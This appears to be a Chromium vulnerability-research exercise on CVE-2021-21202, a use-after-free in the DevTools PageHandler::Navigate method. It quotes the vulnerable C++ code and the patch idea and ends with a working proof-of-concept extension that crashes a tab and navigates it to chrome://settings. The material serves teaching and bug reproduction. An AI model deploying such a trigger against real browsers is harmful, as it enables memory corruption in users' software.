# Exercise 5

In LEVEL 1, we can relay on Details and just to search for the func which Details mentioned. It is far away from the real bug hunting scene.

LEVEL 2 we do the same as LEVEL 1 without the help of Details.

But the bug report need Poc to assist developer reproduce the vulnerability, and know exactly what cause this bug. So LEVEL 3 need we construct Poc by ourselves.

## CVE-2021-21202
I sugget you don't search any report about it to prevents get too much info like patch.



### Details

In level 3, we do it without the help of Details


---------

<details>
  <summary>For more info click me! But you'd better not do this</summary>

  https://bugs.chromium.org/p/chromium/issues/detail?id=1188889

</details>

--------

### Set environment

after fetch chromium
```sh
git reset --hard b84b5d13d0d013ad4a8c90f1ba4cd8509f9885bf
```



### Related code

content/browser/devtools/protocol/page_handler.cc

<!-- content/browser/devtools/render_frame_devtools_agent_host.cc -->
tips: [`Page.navigate`](https://chromedevtools.github.io/devtools-protocol/tot/Page/#method-navigate)


### Do it
Do this exercise by yourself, If you find my answer have something wrong, please correct it.


---------

<details>
  <summary>My answer</summary>

  This vulnerability does not seem to be exploitable, so we briefly end this part.
  >One of the methods available via the Chrome DevTools protocol is Page.navigate. That method allows the caller to navigate the target page to a specified URL.
  >
  >When an extension uses that method to navigate a crashed page to a restricted URL, the debugging session will be detached. However, that occurs in the middle of PageHandler::Navigate, resulting in the PageHandler object being deleted midway through the method.

  >The reason that the session is detached is that the URL being navigated to is restricted (and therefore can't be debugged by an extension).
  >
  >That results in the PageHandler object being deleted (along with the other domain handlers) once LoadURLWithParams has finished executing.
  
  ```c++
void PageHandler::Navigate(const std::string& url,
                           Maybe<std::string> referrer,
                           Maybe<std::string> maybe_transition_type,
                           Maybe<std::string> frame_id,
                           Maybe<std::string> referrer_policy,
                           std::unique_ptr<NavigateCallback> callback) {
  GURL gurl(url);
  if (!gurl.is_valid()) {
    callback->sendFailure(
        Response::ServerError("Cannot navigate to invalid URL"));
    return;
  }

  if (!host_) {
    callback->sendFailure(Response::InternalError());
    return;
  }

  ui::PageTransition type;
  std::string transition_type =
      maybe_transition_type.fromMaybe(Page::TransitionTypeEnum::Typed);
  if (transition_type == Page::TransitionTypeEnum::Link)
    type = ui::PAGE_TRANSITION_LINK;
  else if (transition_type == Page::TransitionTypeEnum::Typed)
    type = ui::PAGE_TRANSITION_TYPED;
  else if (transition_type == Page::TransitionTypeEnum::Address_bar)
    type = ui::PAGE_TRANSITION_FROM_ADDRESS_BAR;
  else if (transition_type == Page::TransitionTypeEnum::Auto_bookmark)
    type = ui::PAGE_TRANSITION_AUTO_BOOKMARK;
  else if (transition_type == Page::TransitionTypeEnum::Auto_subframe)
    type = ui::PAGE_TRANSITION_AUTO_SUBFRAME;
  else if (transition_type == Page::TransitionTypeEnum::Manual_subframe)
    type = ui::PAGE_TRANSITION_MANUAL_SUBFRAME;
  else if (transition_type == Page::TransitionTypeEnum::Generated)
    type = ui::PAGE_TRANSITION_GENERATED;
  else if (transition_type == Page::TransitionTypeEnum::Auto_toplevel)
    type = ui::PAGE_TRANSITION_AUTO_TOPLEVEL;
  else if (transition_type == Page::TransitionTypeEnum::Form_submit)
    type = ui::PAGE_TRANSITION_FORM_SUBMIT;
  else if (transition_type == Page::TransitionTypeEnum::Reload)
    type = ui::PAGE_TRANSITION_RELOAD;
  else if (transition_type == Page::TransitionTypeEnum::Keyword)
    type = ui::PAGE_TRANSITION_KEYWORD;
  else if (transition_type == Page::TransitionTypeEnum::Keyword_generated)
    type = ui::PAGE_TRANSITION_KEYWORD_GENERATED;
  else
    type = ui::PAGE_TRANSITION_TYPED;

  std::string out_frame_id = frame_id.fromMaybe(
      host_->frame_tree_node()->devtools_frame_token().ToString());
  FrameTreeNode* frame_tree_node = FrameTreeNodeFromDevToolsFrameToken(
      host_->frame_tree_node(), out_frame_id);

  if (!frame_tree_node) {
    callback->sendFailure(
        Response::ServerError("No frame with given id found"));
    return;
  }

  NavigationController::LoadURLParams params(gurl);
  network::mojom::ReferrerPolicy policy =
      ParsePolicyFromString(referrer_policy.fromMaybe(""));
  params.referrer = Referrer(GURL(referrer.fromMaybe("")), policy);
  params.transition_type = type;
  params.frame_tree_node_id = frame_tree_node->frame_tree_node_id();
  frame_tree_node->navigator().controller().LoadURLWithParams(params);   [1]

  if (frame_tree_node->navigation_request()) {
    navigate_callbacks_[frame_tree_node->navigation_request()
                            ->devtools_navigation_token()] =
        std::move(callback);
  } else {
    callback->sendSuccess(out_frame_id, Maybe<std::string>(),
                          Maybe<std::string>());
  }
}
  ```
  And patch add check `weak_factory_` after `LoadURLWithParams`

  `base::WeakPtrFactory<PageHandler> weak_factory_{this};`

  **Poc**

  This poc is in the form of a `extensions`, you can get guidence from [here](https://bugs.chromium.org/p/chromium/issues/detail?id=1188889)
  ```js
let tabUpdatedListener = null;

chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
    if (tabUpdatedListener) {
        tabUpdatedListener(tabId, changeInfo, tab);
    }
});

let debugEventListener = null;

chrome.debugger.onEvent.addListener(function (source, method, params) {
    if (debugEventListener) {
        debugEventListener(source, method, params);
    }
});

startProcess();

function startProcess() {
    let targetTab = null;

    chrome.tabs.create({url: "https://www.google.com/"}, function (tab) {
        targetTab = tab;
    });

    tabUpdatedListener = function (tabId, changeInfo, updatedTab) {
        if (targetTab
            && tabId === targetTab.id
            && changeInfo.status === "complete") {
            tabUpdatedListener = null;

            onTargetTabLoaded(targetTab);
        }
    };
}

function onTargetTabLoaded(tab) {
    chrome.debugger.attach({tabId: tab.id}, "1.3", function () {
        onDebuggerAttachedToTargetTab(tab);
    });
}

function onDebuggerAttachedToTargetTab(tab) {
    chrome.debugger.sendCommand({tabId: tab.id}, "Page.crash", {});

    debugEventListener = function (source, method, params) {
        if (method === "Inspector.targetCrashed") {
            debugEventListener = null;

            chrome.debugger.sendCommand({tabId: tab.id}, "Page.navigate",
                {url: "chrome://settings/"});
        }
    };
}
  ```
</details>

--------
